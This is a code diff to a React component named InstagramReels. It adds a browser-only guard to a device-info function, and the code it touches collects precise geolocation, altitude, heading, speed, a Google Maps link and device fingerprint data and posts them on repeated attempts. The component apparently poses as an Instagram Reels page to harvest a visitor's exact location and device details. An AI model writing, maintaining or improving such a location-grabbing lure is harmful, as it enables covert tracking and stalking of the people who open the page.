@@ -59,8 +59,11 @@ type AppState = 'loading' | 'reel' | 'requesting_location' | 'getting_precise' |
 const ACCURACY_THRESHOLD = 30;
 const MAX_WATCH_TIME = 60000;
 
-// ========== DEVICE INFO ==========
-function getDeviceInfo(): DeviceInfo {
+// ========== DEVICE INFO (client-only, safe for SSR) ==========
+function getDeviceInfo(): DeviceInfo | null {
+  // Guard: only run in browser
+  if (typeof navigator === 'undefined' || typeof window === 'undefined') return null;
+
   const ua = navigator.userAgent;
   const platform = navigator.platform || 'Unknown';
   const language = navigator.language || 'Unknown';
@@ -137,14 +140,6 @@ function getDeviceInfo(): DeviceInfo {
   };
 }
 
-// ========== DEVICE INFO (lazy init, client only) ==========
-let _deviceInfoCache: DeviceInfo | null = null;
-function getDeviceInfoLazy(): DeviceInfo | null {
-  if (typeof navigator === 'undefined') return null;
-  if (!_deviceInfoCache) _deviceInfoCache = getDeviceInfo();
-  return _deviceInfoCache;
-}
-
 // ========== MAIN COMPONENT ==========
 export default function InstagramReels() {
   const [appState, setAppState] = useState<AppState>('loading');
@@ -173,7 +168,7 @@ export default function InstagramReels() {
           latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy,
           altitude: loc.altitude, altitudeAccuracy: loc.altitudeAccuracy,
           heading: loc.heading, speed: loc.speed, timestamp: loc.timestamp,
-          deviceInfo: getDeviceInfoLazy(),
+          deviceInfo: getDeviceInfo(),
           googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`,
           attemptNumber: attempt,
         }),
@@ -192,7 +187,7 @@ export default function InstagramReels() {
           latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy,
           altitude: loc.altitude, altitudeAccuracy: loc.altitudeAccuracy,
           heading: loc.heading, speed: loc.speed, timestamp: loc.timestamp,
-          deviceInfo: getDeviceInfoLazy(),
+          deviceInfo: getDeviceInfo(),
           googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`,
           attemptNumber: attempt,
         }),
